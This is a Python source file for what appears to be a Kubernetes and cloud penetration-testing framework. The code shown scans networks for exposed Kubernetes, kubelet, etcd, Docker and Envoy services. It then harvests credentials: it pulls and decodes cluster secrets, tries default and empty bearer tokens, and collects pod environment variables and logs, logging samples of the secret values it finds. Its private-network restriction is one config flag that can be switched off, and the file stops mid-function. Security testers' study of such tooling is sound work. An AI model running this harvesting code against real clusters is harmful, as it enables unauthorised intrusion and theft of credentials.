#!/usr/bin/env python3
"""
Kubernetes & Cloud Penetration Testing Framework
Author: wKayaa
Date: 2025-06-23
Version: 1.0

⚠️ ETHICAL USE ONLY ⚠️
This framework is designed for authorized penetration testing,
bug bounty programs, and security research in controlled environments.
DO NOT use against systems you don't own or have explicit permission to test.
"""

import asyncio
import aiohttp
import aiofiles
import socket
import json
import time
import base64
import jwt
import re
import ssl
import subprocess
import hashlib
import redis
import csv
from datetime import datetime, timedelta
from ipaddress import IPv4Network, IPv4Address
from pathlib import Path
from typing import Dict, List, Optional, Any, Union, Tuple
from dataclasses import dataclass, asdict, field
from enum import Enum
from abc import ABC, abstractmethod
import logging
import argparse
import sys
import os
import yaml
import boto3
from botocore.exceptions import ClientError, NoCredentialsError
import requests
from urllib3.disable_warnings import disable_warnings
from urllib3.exceptions import InsecureRequestWarning
import concurrent.futures
from threading import Lock
import signal
import psutil

# Disable SSL warnings for testing environments
disable_warnings(InsecureRequestWarning)

# ============================================================================
# CORE FRAMEWORK CLASSES AND ENUMS
# ============================================================================

class SeverityLevel(Enum):
    """Niveaux de criticité des vulnérabilités"""
    INFO = "info"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class PhaseType(Enum):
    """Types de phases du framework"""
    INFRASTRUCTURE_DETECTION = "infrastructure_detection"
    CREDENTIAL_EXTRACTION = "credential_extraction"
    KUBERNETES_EXPLOITATION = "kubernetes_exploitation"
    EKS_POD_IDENTITY = "eks_pod_identity"
    ORCHESTRATION = "orchestration"

class ServiceType(Enum):
    """Types de services détectés"""
    KUBERNETES_API = "kubernetes_api"
    KUBELET = "kubelet"
    ETCD = "etcd"
    DOCKER_API = "docker_api"
    ENVOY_ADMIN = "envoy_admin"
    PROMETHEUS = "prometheus"
    GRAFANA = "grafana"
    UNKNOWN = "unknown"

@dataclass
class Target:
    """Représentation d'une cible"""
    host: str
    port: int
    service: ServiceType
    protocol: str = "tcp"
    metadata: Dict[str, Any] = field(default_factory=dict)
    
    def __str__(self):
        return f"{self.host}:{self.port}/{self.service.value}"

@dataclass
class Finding:
    """Structure standardisée pour tous les résultats"""
    id: str
    timestamp: str
    target: str
    service: str
    phase: str
    vulnerability: str
    severity: SeverityLevel
    description: str
    evidence: Dict[str, Any]
    remediation: str
    cvss_score: float = 0.0
    references: List[str] = field(default_factory=list)
    
    def to_dict(self):
        result = asdict(self)
        result['severity'] = self.severity.value
        return result
    
    def to_csv_row(self):
        return [
            self.id, self.timestamp, self.target, self.service,
            self.phase, self.vulnerability, self.severity.value,
            self.description, json.dumps(self.evidence),
            self.remediation, self.cvss_score
        ]

@dataclass
class FrameworkConfig:
    """Configuration globale du framework"""
    # Network settings
    thread_count: int = 100
    timeout: int = 30
    user_agent: str = "KubeSecFramework/1.0"
    max_retries: int = 3
    
    # Output settings
    output_dir: str = "./results"
    log_level: str = "INFO"
    save_json: bool = True
    save_csv: bool = True
    
    # Redis settings (pour orchestration)
    redis_host: str = "localhost"
    redis_port: int = 6379
    redis_db: int = 0
    
    # AWS settings
    aws_region: str = "us-east-1"
    aws_profile: Optional[str] = None
    
    # Scanning settings
    port_scan_timeout: int = 3
    max_concurrent_scans: int = 1000
    
    # Lab environment settings
    lab_mode: bool = True
    allowed_networks: List[str] = field(default_factory=lambda: ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"])

# ============================================================================
# BASE CLASSES
# ============================================================================

class BaseModule(ABC):
    """Classe de base pour tous les modules"""
    
    def __init__(self, config: FrameworkConfig):
        self.config = config
        self.findings: List[Finding] = []
        self.logger = self._setup_logger()
        self.session_timeout = aiohttp.ClientTimeout(total=config.timeout)
        self._finding_lock = Lock()
        self._finding_counter = 0
    
    def _setup_logger(self):
        logger = logging.getLogger(self.__class__.__name__)
        logger.setLevel(getattr(logging, self.config.log_level))
        
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter(
                '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
            )
            handler.setFormatter(formatter)
            logger.addHandler(handler)
        
        return logger
    
    @abstractmethod
    async def execute(self, targets: Union[List[str], List[Target]]) -> List[Finding]:
        """Méthode principale d'exécution du module"""
        pass
    
    def add_finding(self, **kwargs):
        """Ajouter un résultat standardisé avec thread safety"""
        with self._finding_lock:
            self._finding_counter += 1
            finding_id = f"{self.__class__.__name__}_{self._finding_counter}_{int(time.time())}"
        
        finding = Finding(
            id=finding_id,
            timestamp=datetime.utcnow().isoformat(),
            **kwargs
        )
        self.findings.append(finding)
        self.logger.info(f"Finding [{finding.severity.value.upper()}]: {finding.vulnerability} on {finding.target}")
        return finding
    
    def _is_target_allowed(self, target: str) -> bool:
        """Vérification si la cible est dans les réseaux autorisés (lab mode)"""
        if not self.config.lab_mode:
            return True
        
        try:
            target_ip = IPv4Address(target)
            for network in self.config.allowed_networks:
                if target_ip in IPv4Network(network):
                    return True
            return False
        except Exception:
            return False

class RedisOrchestrator:
    """Orchestrateur Redis pour communication inter-modules"""
    
    def __init__(self, config: FrameworkConfig):
        self.config = config
        self.redis_client = None
        self.logger = logging.getLogger("RedisOrchestrator")
    
    async def connect(self):
        """Connexion à Redis"""
        try:
            self.redis_client = redis.Redis(
                host=self.config.redis_host,
                port=self.config.redis_port,
                db=self.config.redis_db,
                decode_responses=True
            )
            self.redis_client.ping()
            self.logger.info("Connected to Redis")
        except Exception as e:
            self.logger.warning(f"Redis connection failed: {e}")
            self.redis_client = None
    
    async def publish_finding(self, finding: Finding):
        """Publication d'un finding"""
        if self.redis_client:
            try:
                await self.redis_client.publish("findings", json.dumps(finding.to_dict()))
            except Exception as e:
                self.logger.error(f"Failed to publish finding: {e}")
    
    async def get_targets(self, channel: str) -> List[str]:
        """Récupération des cibles depuis Redis"""
        if self.redis_client:
            try:
                return self.redis_client.lrange(channel, 0, -1)
            except Exception as e:
                self.logger.error(f"Failed to get targets: {e}")
        return []

# ============================================================================
# PHASE 1 - INFRASTRUCTURE DETECTION
# ============================================================================

class InfrastructureScanner(BaseModule):
    """Scanner d'infrastructure pour détecter les services Kubernetes"""
    
    def __init__(self, config: FrameworkConfig):
        super().__init__(config)
        self.service_ports = {
            # Kubernetes core services
            6443: ServiceType.KUBERNETES_API,    # API Server
            8080: ServiceType.KUBERNETES_API,    # API Server insecure
            8001: ServiceType.KUBERNETES_API,    # kubectl proxy
            10250: ServiceType.KUBELET,          # Kubelet API
            10255: ServiceType.KUBELET,          # Kubelet read-only
            10256: ServiceType.KUBELET,          # kube-proxy health
            
            # etcd
            2379: ServiceType.ETCD,              # etcd client
            2380: ServiceType.ETCD,              # etcd peer
            
            # Docker
            2375: ServiceType.DOCKER_API,        # Docker API insecure
            2376: ServiceType.DOCKER_API,        # Docker API TLS
            
            # Monitoring & observability
            9090: ServiceType.PROMETHEUS,        # Prometheus
            3000: ServiceType.GRAFANA,           # Grafana
            9901: ServiceType.ENVOY_ADMIN,       # Envoy admin
            15000: ServiceType.ENVOY_ADMIN,      # Envoy admin alt
            15001: ServiceType.ENVOY_ADMIN,      # Envoy admin alt
        }
    
    async def execute(self, targets: List[str]) -> List[Finding]:
        """Exécution principale du scan d'infrastructure"""
        self.logger.info(f"Starting infrastructure scan on {len(targets)} targets")
        
        all_targets = []
        for target in targets:
            if '/' in target:  # CIDR notation
                all_targets.extend(self._expand_cidr_targets(target))
            else:
                all_targets.append(target)
        
        # Filtrage des targets autorisées
        allowed_targets = [t for t in all_targets if self._is_target_allowed(t)]
        self.logger.info(f"Scanning {len(allowed_targets)} allowed targets")
        
        # Scan en parallèle avec limitation de concurrence
        semaphore = asyncio.Semaphore(self.config.max_concurrent_scans)
        tasks = [self._scan_target_with_semaphore(semaphore, target) for target in allowed_targets]
        
        await asyncio.gather(*tasks, return_exceptions=True)
        return self.findings
    
    def _expand_cidr_targets(self, cidr: str) -> List[str]:
        """Expansion des plages CIDR en IPs individuelles"""
        try:
            network = IPv4Network(cidr, strict=False)
            return [str(ip) for ip in network.hosts()]
        except Exception as e:
            self.logger.error(f"Invalid CIDR {cidr}: {e}")
            return []
    
    async def _scan_target_with_semaphore(self, semaphore, target):
        """Scan avec semaphore pour limiter la concurrence"""
        async with semaphore:
            await self._scan_target(target)
    
    async def _scan_target(self, target: str):
        """Scan d'un target spécifique"""
        try:
            # Scan rapide des ports
            open_ports = await self._port_scan(target, list(self.service_ports.keys()))
            
            if not open_ports:
                return
            
            self.logger.info(f"Found {len(open_ports)} open ports on {target}")
            
            # Identification des services
            for port in open_ports:
                service_type = self.service_ports.get(port, ServiceType.UNKNOWN)
                service_info = await self._identify_service(target, port)
                
                severity = self._assess_severity(service_type, port, service_info)
                
                self.add_finding(
                    target=f"{target}:{port}",
                    service=service_type.value,
                    phase=PhaseType.INFRASTRUCTURE_DETECTION.value,
                    vulnerability=f"Exposed {service_type.value} service",
                    severity=severity,
                    description=f"{service_type.value} service detected on {target}:{port}",
                    evidence={
                        "port": port,
                        "service_type": service_type.value,
                        "service_info": service_info,
                        "host": target
                    },
                    remediation=self._get_remediation(service_type, port)
                )
                
                # Énumération approfondie du service
                await self._enumerate_service(target, port, service_type)
                
        except Exception as e:
            self.logger.error(f"Error scanning {target}: {e}")
    
    async def _port_scan(self, target: str, ports: List[int]) -> List[int]:
        """Scan de ports asynchrone optimisé"""
        open_ports = []
        timeout = self.config.port_scan_timeout
        
        async def check_port(port):
            try:
                future = asyncio.open_connection(target, port)
                reader, writer = await asyncio.wait_for(future, timeout=timeout)
                writer.close()
                try:
                    await writer.wait_closed()
                except:
                    pass
                return port
            except:
                return None
        
        # Limitation de la concurrence pour éviter l'épuisement des ressources
        semaphore = asyncio.Semaphore(min(100, len(ports)))
        
        async def check_port_with_semaphore(port):
            async with semaphore:
                return await check_port(port)
        
        tasks = [check_port_with_semaphore(port) for port in ports]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        return [port for port in results if port is not None and not isinstance(port, Exception)]
    
    async def _identify_service(self, target: str, port: int) -> Dict[str, Any]:
        """Identification détaillée du service"""
        service_info = {
            "version": None,
            "headers": {},
            "banner": None,
            "ssl_info": {},
            "endpoints": []
        }
        
        # Tentative de récupération de banner HTTP
        for protocol in ['https', 'http']:
            try:
                connector = aiohttp.TCPConnector(ssl=False)
                async with aiohttp.ClientSession(
                    connector=connector,
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as session:
                    url = f"{protocol}://{target}:{port}/"
                    async with session.get(url) as response:
                        service_info["headers"] = dict(response.headers)
                        service_info["status_code"] = response.status
                        
                        # Tentative de récupération du contenu pour identifier le service
                        try:
                            content = await response.text()
                            service_info["content_sample"] = content[:500]
                        except:
                            pass
                        
                        break
            except:
                continue
        
        # Tentative de récupération de banner TCP brut
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port), timeout=3
            )
            
            # Envoi d'une requête HTTP simple
            writer.write(b"GET / HTTP/1.0\r\n\r\n")
            await writer.drain()
            
            banner = await asyncio.wait_for(reader.read(1024), timeout=2)
            service_info["banner"] = banner.decode('utf-8', errors='ignore')
            
            writer.close()
            try:
                await writer.wait_closed()
            except:
                pass
                
        except:
            pass
        
        return service_info
    
    async def _enumerate_service(self, target: str, port: int, service_type: ServiceType):
        """Énumération approfondie d'un service spécifique"""
        if service_type == ServiceType.KUBERNETES_API:
            await self._enumerate_kubernetes_api(target, port)
        elif service_type == ServiceType.KUBELET:
            await self._enumerate_kubelet(target, port)
        elif service_type == ServiceType.DOCKER_API:
            await self._enumerate_docker_api(target, port)
        elif service_type == ServiceType.ETCD:
            await self._enumerate_etcd(target, port)
        elif service_type == ServiceType.ENVOY_ADMIN:
            await self._enumerate_envoy(target, port)
    
    async def _enumerate_kubernetes_api(self, target: str, port: int):
        """Énumération de l'API Kubernetes"""
        endpoints = [
            "/api/v1",
            "/version",
            "/healthz",
            "/metrics",
            "/openapi/v2",
            "/api/v1/namespaces",
            "/api/v1/nodes",
            "/api/v1/pods",
            "/api/v1/secrets",
            "/api/v1/configmaps"
        ]
        
        for protocol in ['https', 'http']:
            base_url = f"{protocol}://{target}:{port}"
            
            async with aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False),
                timeout=self.session_timeout
            ) as session:
                
                for endpoint in endpoints:
                    try:
                        async with session.get(f"{base_url}{endpoint}") as response:
                            if response.status == 200:
                                self.add_finding(
                                    target=f"{target}:{port}",
                                    service="kubernetes_api_endpoint",
                                    phase=PhaseType.INFRASTRUCTURE_DETECTION.value,
                                    vulnerability="Accessible Kubernetes API endpoint",
                                    severity=SeverityLevel.INFO if endpoint in ["/version", "/healthz"] else SeverityLevel.MEDIUM,
                                    description=f"Accessible endpoint: {endpoint}",
                                    evidence={
                                        "endpoint": endpoint,
                                        "status_code": response.status,
                                        "url": f"{base_url}{endpoint}"
                                    },
                                    remediation="Review API access controls and authentication"
                                )
                            elif response.status == 401:
                                self.add_finding(
                                    target=f"{target}:{port}",
                                    service="kubernetes_api_endpoint",
                                    phase=PhaseType.INFRASTRUCTURE_DETECTION.value,
                                    vulnerability="Kubernetes API endpoint requires authentication",
                                    severity=SeverityLevel.INFO,
                                    description=f"Endpoint {endpoint} requires authentication",
                                    evidence={
                                        "endpoint": endpoint,
                                        "status_code": response.status,
                                        "url": f"{base_url}{endpoint}"
                                    },
                                    remediation="Ensure proper authentication is configured"
                                )
                    except Exception as e:
                        self.logger.debug(f"Error accessing {endpoint} on {target}:{port}: {e}")
    
    async def _enumerate_kubelet(self, target: str, port: int):
        """Énumération des endpoints Kubelet"""
        endpoints = [
            "/pods",
            "/metrics",
            "/logs",
            "/stats",
            "/spec",
            "/healthz",
            "/metrics/cadvisor",
            "/metrics/probes",
            "/runningpods"
        ]
        
        for protocol in ['https', 'http']:
            base_url = f"{protocol}://{target}:{port}"
            
            async with aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False),
                timeout=self.session_timeout
            ) as session:
                
                for endpoint in endpoints:
                    try:
                        async with session.get(f"{base_url}{endpoint}") as response:
                            if response.status == 200:
                                content_length = len(await response.text())
                                
                                severity = SeverityLevel.HIGH if endpoint in ["/pods", "/logs"] else SeverityLevel.MEDIUM
                                
                                self.add_finding(
                                    target=f"{target}:{port}",
                                    service="kubelet_endpoint",
                                    phase=PhaseType.INFRASTRUCTURE_DETECTION.value,
                                    vulnerability="Accessible Kubelet endpoint",
                                    severity=severity,
                                    description=f"Accessible Kubelet endpoint: {endpoint}",
                                    evidence={
                                        "endpoint": endpoint,
                                        "content_length": content_length,
                                        "url": f"{base_url}{endpoint}"
                                    },
                                    remediation="Secure Kubelet API with proper authentication and authorization"
                                )
                    except Exception as e:
                        self.logger.debug(f"Error accessing Kubelet {endpoint} on {target}:{port}: {e}")
    
    async def _enumerate_docker_api(self, target: str, port: int):
        """Énumération de l'API Docker"""
        endpoints = [
            "/version",
            "/info",
            "/containers/json",
            "/images/json",
            "/networks",
            "/volumes",
            "/system/df"
        ]
        
        protocol = "https" if port == 2376 else "http"
        base_url = f"{protocol}://{target}:{port}"
        
        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False),
            timeout=self.session_timeout
        ) as session:
            
            for endpoint in endpoints:
                try:
                    async with session.get(f"{base_url}{endpoint}") as response:
                        if response.status == 200:
                            severity = SeverityLevel.CRITICAL if endpoint in ["/containers/json", "/images/json"] else SeverityLevel.HIGH
                            
                            self.add_finding(
                                target=f"{target}:{port}",
                                service="docker_api_endpoint",
                                phase=PhaseType.INFRASTRUCTURE_DETECTION.value,
                                vulnerability="Accessible Docker API endpoint",
                                severity=severity,
                                description=f"Accessible Docker API endpoint: {endpoint}",
                                evidence={
                                    "endpoint": endpoint,
                                    "url": f"{base_url}{endpoint}",
                                    "secured": port == 2376
                                },
                                remediation="Secure Docker API with TLS authentication and proper access controls"
                            )
                except Exception as e:
                    self.logger.debug(f"Error accessing Docker API {endpoint} on {target}:{port}: {e}")
    
    async def _enumerate_etcd(self, target: str, port: int):
        """Énumération d'etcd"""
        endpoints = [
            "/version",
            "/health",
            "/v2/keys",
            "/v3/kv/range"
        ]
        
        for protocol in ['https', 'http']:
            base_url = f"{protocol}://{target}:{port}"
            
            async with aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False),
                timeout=self.session_timeout
            ) as session:
                
                for endpoint in endpoints:
                    try:
                        async with session.get(f"{base_url}{endpoint}") as response:
                            if response.status == 200:
                                self.add_finding(
                                    target=f"{target}:{port}",
                                    service="etcd_endpoint",
                                    phase=PhaseType.INFRASTRUCTURE_DETECTION.value,
                                    vulnerability="Accessible etcd endpoint",
                                    severity=SeverityLevel.CRITICAL,
                                    description=f"Accessible etcd endpoint: {endpoint}",
                                    evidence={
                                        "endpoint": endpoint,
                                        "url": f"{base_url}{endpoint}"
                                    },
                                    remediation="Secure etcd with proper authentication and network isolation"
                                )
                    except Exception as e:
                        self.logger.debug(f"Error accessing etcd {endpoint} on {target}:{port}: {e}")
    
    async def _enumerate_envoy(self, target: str, port: int):
        """Énumération d'Envoy Admin"""
        endpoints = [
            "/",
            "/stats",
            "/clusters",
            "/config_dump",
            "/listeners",
            "/server_info"
        ]
        
        base_url = f"http://{target}:{port}"
        
        async with aiohttp.ClientSession(timeout=self.session_timeout) as session:
            for endpoint in endpoints:
                try:
                    async with session.get(f"{base_url}{endpoint}") as response:
                        if response.status == 200:
                            self.add_finding(
                                target=f"{target}:{port}",
                                service="envoy_admin_endpoint",
                                phase=PhaseType.INFRASTRUCTURE_DETECTION.value,
                                vulnerability="Accessible Envoy admin endpoint",
                                severity=SeverityLevel.HIGH,
                                description=f"Accessible Envoy admin endpoint: {endpoint}",
                                evidence={
                                    "endpoint": endpoint,
                                    "url": f"{base_url}{endpoint}"
                                },
                                remediation="Disable Envoy admin interface or restrict access"
                            )
                except Exception as e:
                    self.logger.debug(f"Error accessing Envoy {endpoint} on {target}:{port}: {e}")
    
    def _assess_severity(self, service_type: ServiceType, port: int, service_info: Dict) -> SeverityLevel:
        """Évaluation de la criticité"""
        critical_services = [ServiceType.ETCD, ServiceType.DOCKER_API]
        high_services = [ServiceType.KUBERNETES_API, ServiceType.KUBELET, ServiceType.ENVOY_ADMIN]
        
        if service_type in critical_services:
            return SeverityLevel.CRITICAL
        elif service_type in high_services:
            return SeverityLevel.HIGH
        elif port in [2375]:  # Docker API insecure
            return SeverityLevel.CRITICAL
        else:
            return SeverityLevel.MEDIUM
    
    def _get_remediation(self, service_type: ServiceType, port: int) -> str:
        """Recommandations de remediation"""
        remediations = {
            ServiceType.KUBERNETES_API: "Configure proper RBAC, enable authentication, and use network policies",
            ServiceType.KUBELET: "Enable Kubelet authentication and authorization, restrict network access",
            ServiceType.ETCD: "Enable etcd authentication, use TLS, and restrict network access",
            ServiceType.DOCKER_API: "Enable TLS authentication for Docker API, restrict network access",
            ServiceType.ENVOY_ADMIN: "Disable admin interface or restrict to localhost only",
            ServiceType.PROMETHEUS: "Configure authentication and restrict metrics exposure",
            ServiceType.GRAFANA: "Configure proper authentication and access controls"
        }
        
        return remediations.get(service_type, "Review service configuration and access controls")

# ============================================================================
# PHASE 2 - CREDENTIAL EXTRACTION
# ============================================================================

class CredentialExtractor(BaseModule):
    """Extracteur de credentials depuis les services Kubernetes"""
    
    def __init__(self, config: FrameworkConfig):
        super().__init__(config)
        self.sensitive_patterns = [
            r'(?i)(api[_-]?key|token|secret|password|credential|auth)[\s]*[:=][\s]*["\']?([a-zA-Z0-9\-_\.]{16,})["\']?',
            r'(?i)bearer[\s]+([a-zA-Z0-9\-_\.]+)',
            r'(?i)(aws|gcp|azure|k8s)[\s]*[:=][\s]*["\']?([a-zA-Z0-9\-_]{16,})["\']?',
            r'eyJ[a-zA-Z0-9\-_]+\.eyJ[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+',  # JWT pattern
            r'-----BEGIN [A-Z ]+-----[\s\S]*?-----END [A-Z ]+-----',  # Certificate/Key pattern
        ]
        
        self.sensitive_env_vars = [
            'password', 'secret', 'token', 'key', 'credential',
            'aws_access_key', 'aws_secret_key', 'api_key',
            'database_url', 'db_password', 'redis_password'
        ]
    
    async def execute(self, targets: List[Target]) -> List[Finding]:
        """Exécution principale de l'extraction de credentials"""
        self.logger.info(f"Starting credential extraction on {len(targets)} targets")
        
        tasks = []
        for target in targets:
            if isinstance(target, str):
                # Convert string to Target if needed
                host, port = target.split(':') if ':' in target else (target, 80)
                target = Target(host=host, port=int(port), service=ServiceType.UNKNOWN)
            
            if not self._is_target_allowed(target.host):
                continue
            
            tasks.append(self._extract_from_target(target))
        
        await asyncio.gather(*tasks, return_exceptions=True)
        return self.findings
    
    async def _extract_from_target(self, target: Target):
        """Extraction depuis une cible spécifique"""
        try:
            # Extraction basée sur le type de service
            if target.service == ServiceType.KUBERNETES_API:
                await self._extract_from_k8s_api(target)
            elif target.service == ServiceType.KUBELET:
                await self._extract_from_kubelet(target)
            elif target.service == ServiceType.DOCKER_API:
                await self._extract_from_docker_api(target)
            elif target.service == ServiceType.ETCD:
                await self._extract_from_etcd(target)
            
            # Extraction générique depuis les endpoints de métriques
            await self._extract_from_metrics(target)
            
        except Exception as e:
            self.logger.error(f"Error extracting credentials from {target}: {e}")
    
    async def _extract_from_k8s_api(self, target: Target):
        """Extraction depuis l'API Kubernetes"""
        endpoints = [
            "/api/v1/secrets",
            "/api/v1/configmaps",
            "/api/v1/serviceaccounts",
            "/api/v1/namespaces/kube-system/secrets",
            "/api/v1/namespaces/default/secrets"
        ]
        
        for protocol in ['https', 'http']:
            base_url = f"{protocol}://{target.host}:{target.port}"
            
            async with aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False),
                timeout=self.session_timeout
            ) as session:
                
                for endpoint in endpoints:
                    try:
                        async with session.get(f"{base_url}{endpoint}") as response:
                            if response.status == 200:
                                data = await response.json()
                                await self._analyze_k8s_resources(target, endpoint, data)
                            elif response.status == 401:
                                # Try with common default tokens
                                await self._try_default_tokens(session, base_url, endpoint, target)
                    except Exception as e:
                        self.logger.debug(f"Error accessing {endpoint}: {e}")
    
    async def _try_default_tokens(self, session, base_url, endpoint, target):
        """Tentative avec des tokens par défaut"""
        default_tokens = [
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",  # Example default token
            "Bearer token",
            "admin",
            ""
        ]
        
        for token in default_tokens:
            try:
                headers = {"Authorization": f"Bearer {token}"} if token else {}
                async with session.get(f"{base_url}{endpoint}", headers=headers) as response:
                    if response.status == 200:
                        self.add_finding(
                            target=str(target),
                            service="kubernetes_api",
                            phase=PhaseType.CREDENTIAL_EXTRACTION.value,
                            vulnerability="Default or weak authentication token",
                            severity=SeverityLevel.CRITICAL,
                            description=f"Access granted with default/weak token on {endpoint}",
                            evidence={
                                "endpoint": endpoint,
                                "token_used": token[:20] + "..." if len(token) > 20 else token
                            },
                            remediation="Change default tokens and implement strong authentication"
                        )
                        break
            except Exception:
                continue
    
    async def _analyze_k8s_resources(self, target: Target, endpoint: str, data: Dict):
        """Analyse des ressources Kubernetes pour détecter des secrets"""
        if 'items' not in data:
            return
        
        for item in data['items']:
            if endpoint.endswith('/secrets'):
                await self._analyze_secret(target, item)
            elif endpoint.endswith('/configmaps'):
                await self._analyze_configmap(target, item)
            elif endpoint.endswith('/serviceaccounts'):
                await self._analyze_serviceaccount(target, item)
    
    async def _analyze_secret(self, target: Target, secret: Dict):
        """Analyse d'un secret Kubernetes"""
        secret_name = secret.get('metadata', {}).get('name', 'unknown')
        secret_data = secret.get('data', {})
        
        for key, value in secret_data.items():
            try:
                # Décodage base64
                decoded_value = base64.b64decode(value).decode('utf-8')
                
                # Vérification des patterns sensibles
                sensitive_findings = await self._scan_for_sensitive_data(decoded_value)
                
                if sensitive_findings:
                    self.add_finding(
                        target=str(target),
                        service="kubernetes_secret",
                        phase=PhaseType.CREDENTIAL_EXTRACTION.value,
                        vulnerability="Sensitive data in Kubernetes secret",
                        severity=SeverityLevel.HIGH,
                        description=f"Sensitive data found in secret {secret_name}, key {key}",
                        evidence={
                            "secret_name": secret_name,
                            "key": key,
                            "patterns_found": sensitive_findings,
                            "value_sample": decoded_value[:100] + "..." if len(decoded_value) > 100 else decoded_value
                        },
                        remediation="Review secret content and implement proper secret management"
                    )
                
                # Vérification spécifique des tokens JWT
                if await self._is_jwt_token(decoded_value):
                    jwt_info = await self._decode_jwt(decoded_value)
                    
                    self.add_finding(
                        target=str(target),
                        service="jwt_token",
                        phase=PhaseType.CREDENTIAL_EXTRACTION.value,
                        vulnerability="JWT token in Kubernetes secret",
                        severity=SeverityLevel.HIGH,
                        description=f"JWT token found in secret {secret_name}",
                        evidence={
                            "secret_name": secret_name,
                            "key": key,
                            "jwt_info": jwt_info,
                            "token_sample": decoded_value[:50] + "..."
                        },
                        remediation="Rotate JWT tokens and implement proper secret lifecycle management"
                    )
                    
            except Exception as e:
                self.logger.debug(f"Error decoding secret value: {e}")
    
    async def _analyze_configmap(self, target: Target, configmap: Dict):
        """Analyse d'une ConfigMap"""
        configmap_name = configmap.get('metadata', {}).get('name', 'unknown')
        configmap_data = configmap.get('data', {})
        
        for key, value in configmap_data.items():
            sensitive_findings = await self._scan_for_sensitive_data(str(value))
            
            if sensitive_findings:
                self.add_finding(
                    target=str(target),
                    service="kubernetes_configmap",
                    phase=PhaseType.CREDENTIAL_EXTRACTION.value,
                    vulnerability="Sensitive data in ConfigMap",
                    severity=SeverityLevel.MEDIUM,
                    description=f"Sensitive data found in ConfigMap {configmap_name}, key {key}",
                    evidence={
                        "configmap_name": configmap_name,
                        "key": key,
                        "patterns_found": sensitive_findings
                    },
                    remediation="Move sensitive data to Kubernetes secrets"
                )
    
    async def _extract_from_kubelet(self, target: Target):
        """Extraction depuis Kubelet"""
        endpoints = ["/pods", "/metrics", "/stats/summary"]
        
        for protocol in ['https', 'http']:
            base_url = f"{protocol}://{target.host}:{target.port}"
            
            async with aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False),
                timeout=self.session_timeout
            ) as session:
                
                for endpoint in endpoints:
                    try:
                        async with session.get(f"{base_url}{endpoint}") as response:
                            if response.status == 200:
                                if endpoint == "/pods":
                                    data = await response.json()
                                    await self._analyze_kubelet_pods(target, data)
                                else:
                                    content = await response.text()
                                    sensitive_findings = await self._scan_for_sensitive_data(content)
                                    
                                    if sensitive_findings:
                                        self.add_finding(
                                            target=str(target),
                                            service="kubelet_endpoint",
                                            phase=PhaseType.CREDENTIAL_EXTRACTION.value,
                                            vulnerability="Sensitive data in Kubelet endpoint",
                                            severity=SeverityLevel.MEDIUM,
                                            description=f"Sensitive data found in {endpoint}",
                                            evidence={
                                                "endpoint": endpoint,
                                                "patterns_found": sensitive_findings
                                            },
                                            remediation="Review Kubelet configuration and restrict access"
                                        )
                    except Exception as e:
                        self.logger.debug(f"Error accessing Kubelet {endpoint}: {e}")
    
    async def _analyze_kubelet_pods(self, target: Target, pods_data: Dict):
        """Analyse des pods depuis Kubelet"""
        for pod in pods_data.get('items', []):
            pod_name = pod.get('metadata', {}).get('name', 'unknown')
            
            # Analyse des variables d'environnement
            containers = pod.get('spec', {}).get('containers', [])
            for container in containers:
                env_vars = container.get('env', [])
                for env_var in env_vars:
                    if await self._is_sensitive_env_var(env_var):
                        self.add_finding(
                            target=str(target),
                            service="pod_environment",
                            phase=PhaseType.CREDENTIAL_EXTRACTION.value,
                            vulnerability="Sensitive environment variable in pod",
                            severity=SeverityLevel.HIGH,
                            description=f"Sensitive environment variable in pod {pod_name}",
                            evidence={
                                "pod_name": pod_name,
                                "container": container.get('name'),
                                "env_var_name": env_var.get('name'),
                                "env_var_value": env_var.get('value', '')[:50] + "..." if len(env_var.get('value', '')) > 50 else env_var.get('value', '')
                            },
                            remediation="Use Kubernetes secrets for sensitive environment variables"
                        )
            
            # Tentative d'extraction de logs
            await self._extract_pod_logs(target, pod_name)
    
    async def _extract_pod_logs(self, target: Target, pod_name: str):
        """Extraction des logs d'un pod"""
        log_endpoint = f"/logs/{pod_name}"
        
        for protocol in ['https', 'http']:
            base_url = f"{protocol}://{target.host}:{target.port}"
            
            async with aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False),
                timeout=self.session_timeout
            ) as session:
                
                try:
                    async with session.get(f"{base_url}{log_endpoint}") as response:
                        if response.status == 200:
                            logs = await response.text()
                            sensitive_findings = await self._scan_for_sensitive_data(logs)
                            
                            if sensitive_findings:
                                self.add_finding(
                                    target=str(target),
                                    service="pod_logs",
                                    phase=PhaseType.CREDENTIAL_EXTRACTION.value,
                                    vulnerability="Sensitive data in pod logs",
                                    severity=SeverityLevel.MEDIUM,
                                    description=f"Sensitive data found in logs of pod {pod_name}",
                                    evidence={
                                        "pod_name": pod_name,
                                        "patterns_found": sensitive_findings
                                    },
                                    remediation="Review application logging practices and filter sensitive data"
                                )
                except Exception as e:
                    self.logger.debug(f"Error accessing logs for pod {pod_name}: {e}")
    
    async def _extract_from_docker_api(self, target: Target):
        """Extraction depuis l'API Docker"""
        endpoints = ["/containers/json", "/images/json"]
        
        protocol = "https" if target.port == 2376 else "http"
        base_url = f"{protocol}://{target.host}:{target.port}"
        
        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False),
            timeout=self.session_timeout
        ) as session:
            
            for endpoint in endpoints:
                try:
                    async with session.get(f"{base_url}{endpoint}") as response:
                        if response.status == 200:
                            data = await response.json()
                            
                            if endpoint == "/containers/json":
                                await self._analyze_docker_containers(target, data)
                            elif endpoint == "/images/json":
                                await self._analyze_docker_images(target, data)
                                
                except Exception as e:
                    self.logger.debug(f"Error accessing Docker API {endpoint}: {e}")
    
    async def _analyze_docker_containers(self, target: Target, containers: List[Dict]):
        """Analyse des conteneurs Docker"""
